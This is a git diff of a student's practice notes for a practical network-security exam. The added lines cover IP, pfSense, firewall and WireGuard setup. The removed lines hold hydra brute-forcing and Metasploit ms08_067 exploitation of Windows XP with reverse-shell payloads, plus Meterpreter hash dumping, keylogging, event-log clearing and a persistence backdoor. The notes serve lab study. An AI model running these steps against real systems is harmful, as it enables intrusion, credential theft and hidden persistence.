@@ -1,18 +1,25 @@
 # Practical Exam 2 Practice
 
->Author: Dongyi Guo
-
-* During the formal test, you are only using Kali Linux, steps for setting up other machines are here for your own practice.
+* Do NOT touch pfSence's IP configuration, leave WAN at 144.6.40.1/25 and LAN at 144.6.40.129/25.
 * Everything that is inside ```<...>``` requires you to find proper answer to fill in.
 
-## Question 1
+## Question 1 - IP Configuration
 
-#### Linux Network Setup (Kali, Metasploitable2):
+#### Linux Network Setup
 
-To assign IP  on Linux:
+**For Kali and Metasploitable:**
+
+To assign IP:
 
 ```bash
 ip a a <IP>/<Prefix> dev <NetworkInterface>
+```
+
+If you need to remove an exising IP, or a wrongly-added IP:
+
+```bash
+ip a d <IP>/<Prefix> dev <NetworkInterface> 
+# Make sure the rest is same as when you "ip addr add ..."
 ```
 
 To check current IP configuration, use:
@@ -27,18 +34,28 @@ or
 ifconfig
 ```
 
-and check the ```inet``` parameter of your network interface for IPv4 address. You only need to config IP Kali during you test, for Metasploitable2 , run the setup command with ```sudo``` with msfadmin.
+and check the ```inet``` parameter of your network interface for IPv4 address. 
+
+* If you are using ```eth1``` interface of Kali, make sure you bring it up with ```ifup eth1```.
+* For Metasploitable2 , run the setup command with ```sudo``` with msfadmin.
+
+**For Ubuntu and RoamingWorker:**
+
+* Click the system tray at upper right corner.
+* Click the network interface you want to config on, in the expanded menu click "Wired Settings".
+* Click the cog icon aside the targeted network interface.
+* In the pop-up window, go to "IPv4" tabs, select "Manual" on IPv4 Method.
+* In the "Addresses" section, give IP address, subnet mask, and gateway if necessary.
+* Click "Apply" to apply the configuration, then in the Network settings page, turn off and on the interface to ensure your configuration is activated.
 
 #### Windows Network Setup:
 
-* You don't need to do this during your formal test.
-
-To setup network on Windows 7 and higher:
+To setup network on Windows 7 or Windows Server 2016:
 
 * Go to Network and Sharing Center, click on the connection.
 * Then select Properties.
 * Then highlight the "Internet Protocol Version 4 (TCP/IPv4)", select Properties.
-* Assign IP accordingly.
+* Assign IP, subnetmask, or gateway if needed accordingly.
 
 For Windows XP:
 
@@ -47,201 +64,144 @@ For Windows XP:
 * Double-click the network.
 * Select Properties.
 * Then highlight "Internet Protocol [TCP/IP]", select Properties.
-* Assign IP accordingly.
+* Assign IP, subnetmask, or gateway if needed accordingly.
+
+#### With pfSense
+
+If pfSense is involved, an internal network (LAN) and an external network (WAN) are considered in the infrasturcture:
+
+* The subnet mask is 255.255.255.128 as the network prefix is /25.
+
+* Whichever hosts locate in the **LAN side requires a gateway** to be set as the LAN port of pfSense (144.6.40.129).
+
+  * For Windows 7, make sure you select the network type as "Work" after setting up gateway.
+
+* Whichever hosts locate in the **WAN side requires to set a static route**, transferring all traffic to the internal network (LAN) through the WAN side of pfSense:
+
+  * ```bash
+    ip r a <InternalNetworkAddress>/<Prefix> via <pfSenseWAN> dev <NetworkInterface>
+    ```
+
+  * By default, pfSense's WAN side is 144.6.40.1.
+
+  * If you are using RoamingWorker the external network interface should be ```ens36```, if Kali then ```eth1```.
+
+  * Verify with:
+
+    * ```bash
+      ip r
+      ```
+
+    * You should see an entry of your internal network address is being transferred to the pfSense WAN side IP.
 
 ## Question 2
 
-To find live hosts on current network, use ```nmap```:
+#### Ubuntu
+
+In the paper, find:
+
+* What Protocol
+* What Port Number
+* What Operation to apply: Allow or Block
+
+Then, to configure the firewall (iptables), become root:
 
 ```bash
-nmap -sn <NetworkAddress/Prefix>
+sudo su -
+# student's password is "student"
 ```
 
-For port scanning:
+then, set up the rule:
 
 ```bash
-nmap <HostAddress>
+iptables -A INPUT -p <Protocol> --dport <PortNumber> -j <Action>
 ```
 
-For OS information:
+* Action can be "ACCEPT" or "DROP"
+
+It is NOT mentioned in the tutorial, but you can use ```-s``` to apply an iptable rule to a specific host (or even network) address, this rule then will only apply to only the specified host(s) instead of all incoming-requesting hosts:
 
 ```bash
-nmap -O -v <HostAddress>
+iptables -A INPUT -s <SpecificHostIPAddress> -p <Protocol> --dport <PortNumber> -j <Action>
 ```
 
-To turn off the firewall on Windows (for your own practice) :
+#### Windows Server 2016
 
-* Search "Windows Firewall" and select the option with exactly these 2 words.
-* Click "Turn Windows Firewall on or off" on side menu.
-* Turn off the firewall.
+1. In Server Manger, go to "Tools", open "Windows Firewall and Security".
+2. Click "Inbound Rules" in the hierarchy at left side.
+3. Click New Rules on the action panel at right side.
+4. In the popped-up window, select "Custom Rules".
+5. Leave "All Programs".
+6. Select the Protocol you want to apply rules on, then in Local Ports, enter the port you want to apply to.
+7. In Remote IP section, select to specify and add the IP of target you want to apply rules to.
+8. Select the behaviour the paper asked, such as Block.
+9. Accept all domains.
+10. Give name and description in the paper, apply the rule.
 
 ## Question 3
 
-To brute-force a password of a given username with a specific service protocol on a remote host, use ```hydra```:
+* Config Windows 7 and Kali accordingly with the steps in Question 1, making sure their IPs land in the range of pfSense networks.
+* Don't forget Kali needs a static route as it's on the WAN side, and Windows 7 needs gateway as it's on the LAN side. Check Question 1 subsection "With pfSense".
 
-* You will need a password dictionary to power the brute-force operation.
+Once the network is configured, Windows 7 will be able to visit pfSense control panel by visiting pfSense's LAN side address (144.6.40.129 by default), login with admin/admin. After logged in:
 
-```bash
-hydra -l <LoginUsername> -P <PathToPasswordDictionary> <HostIPAddress> <ServiceProtocol> -t <ParallelAttempts>
-```
+* Click "Firewall" at the top bar, in the dropdown, click "Rules".
+* Click the first "Add" button.
 
-To check all available service protocols, use
+If creating a rule for ping:
 
-```bash
-man hydra
-```
+* Select Protocol as "ICMP".
+* You will be able to select subtypes, for ping, select "Echo request".
+* Fill the description if the Question asked you to.
+* Click the Save button.
+* Then in the new page, click "Apply Changes".
+
+If creating a rule for specific incoming TCP requests:
+
+* Select Protocol as "TCP".
+* Select the correct Destination Port or in "other" theme fill the port number in both "from" and "to" for "Destination Port Range".
+* Fill the description if the Question asked you to.
+* Click the Save button.
+* Then in the new page, click "Apply Changes".
 
 ## Question 4
 
-Windows XP can be exploited by:
+* Config RoamingWorker's network in the WAN side of the pfSense if required, remeber as it lays on the WAN side, it will use ```ens36``` network interface, and a static route will be needed.
 
-* VNC injection, returns a GUI view or control
-* Meterpreter, returns a command prompt to perform miscellaneous actions on target host.
-
-For VNC injection, while in Metasploitable Framework prompt ( ```msf6>``` ): 
+To set up Wireguard, first get into root:
 
 ```bash
-use exploit/windows/smb/ms08_067_netapi
-set payload windows/vncinject/reverse_tcp
-set LHOST <KaliIPAddress>
-set RHOST <XPIPAddress>
-set ViewOnly false
-exploit
+sudo su -
+# student's password is "student".
 ```
 
-For Meterpreter:
+Then direct to the Wireguard config folder to create Wireguard keypair:
 
 ```bash
-use exploit/windows/smb/ms08_067_netapi
-set payload windows/meterpreter/reverse_tcp
-set LHOST <KaliIPAddress>
-set RHOST <XPIPAddress>
-exploit
+cd /etc/wireguard
+
+# This removes all permissions on group and other users for default permission upon file creation.
+# If the default is 644, minus 077 makes it 600 (no minus).
+umask 077 
+
+# wg genkey: creates a private key, then pipe the content to tee.
+# tee privatekey: forks the text stream from pipe before, one into file "privatekey", one in stdout which get piped to wg pubkey.
+# wg pubkey: takes the privatekey from tee on stdout through pipe, then redirect the public key to file "publickey".
+wg genkey | tee privatekey | wg pubkey > publickey
 ```
 
-During Meterpreter session ( ```meterpreter>``` ), commands that could be useful:
+If you ```ls``` now, two files ```privatekey``` and ```publickey``` will be presented. Then config the network interface for Wireguard:
 
 ```bash
-cd <DirectoryPath> # Change directory
-ls # List directory
-pwd # Current directory
-sysinfo # System information
-ipconfig # Network information
-screenshot # Take a screenshot from target host
-hashdump # Dump all user's hashes on the screen
-search -f <filename> # Search file based on name in current directory
-download <RemotePath> <LocalPath> # Remote download file from target host to local
-# Remember the path for download command has to be Unix type, for Windows '\',
-# Either double it '\\' or change back to '/'.
+# If current directory is not at /etc/wireguard.
+cd /etc/wireguard
 
-clearev # Clean event logs
+# Create the Wireguard network interface (wg0 in tutorial)
+ip link add <NetworkInterfaceName> type wireguard
 
-getpid # Get current process ID
-ps # List current Processes on target host
-migrate <processID> # Migrate to process ID
-# Keylogger only works when Meterpreter is paratisitizing a process with relative high privilege:
-keyscan_start # Start key logging
-keyscan_dump # Dump key logging
-keyscan_stop # Stop key logging
+# Assign the private IP used in Wireguard tunnel (10.0.0.x/24 in tutorial)
+ip a a <PrivateIP>/<Prefix> dev wg0
 
-# Backgroud current session
-background
-# Or
-bg
-# Or ctrl + z
+# Config the interface with listening port (51820 in tutorial) and private key
+wg set <NetworkInterfaceName> listen-port <GivenWireguardPort> privatekey ./privatekey
 ```
-
-To add backdoor on the Meterpreter session, background the session, then in MSF prompt:
-
-```bash
-use exploit/windows/local/persistence
-set LHOST <KaliIPAddress>
-set LPORT 445
-set STARTUP SYSTEM # DO NOT lowercase SYSTEM, as it is parameter value
-sessions # Get the meterpreter session's ID
-set session <MeterpreterSessionID> 
-exploit
-```
-
-Then, use multi/handler to listen the incoming connection:
-
-```bash
-use multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST <KaliIPAddress>
-set LPORT 445
-run # alias of exploit, use any
-```
-
-After that, if XP gets rebooted, it will send back the connection and Kali will enter Meterpreter prompt automatically.
-
-## MSF Essentials
-
-In MSF prompts, several things:
-
-```bash
-search <Keyword> # Search exploits via keyword
-show options # Give current configurable parameters for current exploit and payload
-show paylaods # Show possible payloads for current exploit
-show targets # Show possible targets for current exploit
-```
-
-* Use ```setg``` instead of ```set``` to preserve parameter values across different exploits with the same parameter name.
-* The parameter names are case-insensitive, but if the parameter values are given accepted value (Accepted: ...), you must match the case:
-
-```bash
-set sTArTuP SYSTEM # That is okay
-set STARTUP system # NOT OKAY
-```
-
-## Post-Exploitation Information Gathering
-
-* This means gathering information after you retrieve administrative priviledge on a target.
-
-If you have a reverse shell session and you want to upgrade it to Meterpreter session: use:
-
-```bash
-sessions # Check the session ID of your reverse shell session
-sessions -u <ReverseShellSessionID>
-```
-
-If you have a unprivileged Meterpreter session, to find exploit escalating your privilege, use:
-
-```bash
-sessions # Check the session ID of your unprivileged session
-use post/multi/recon/local_exploit_suggester
-set session <UnprivilegedMeterpreterSessionID>
-run
-```
-
-to find possible vulnerabilities can be used to escalate your priviledge.
-
-Once you have the administrative privilege, to find all modules that are helpful for information gathering, use:
-
-```bash
-# For Linux
-search post/linux/gather
-# For Windows
-search post/windows/gather
-```
-
-Common useful modules to gather information about your target:
-
-```bash
-use post/<linux/windows>/gather/checkvm # Identify whether a target is virtual machine, and if so what virtualisation it is
-use post/linux/gather/checkcontainer # Identify whether a target is a containerized, and if so what type of container it is
-use post/linux/gather/hashdump # Dump user's hashes on screen
-use post/windows/gather/smart_hashdump # Dump user's hashes on screen and save them into /root/.msf4/loot/
-use post/linux/gather/enum_protections # List target's security protection measurements
-use post/linux/gather/enum_configs # List target's service configurations and save them into /root/.msf4/loot/
-use post/linux/gather/enum_network # List target's network infrastructure information and configurations and save them into /root/.msf4/loot/
-use post/linux/gather/enum_system # List target's system information and save them into /root/.msf4/loot/
-```
-
-Then set the Meterpreter session and run to gather the information:
-
-```bash
-set session <MeterpreterSessionID>
-run
-```
-
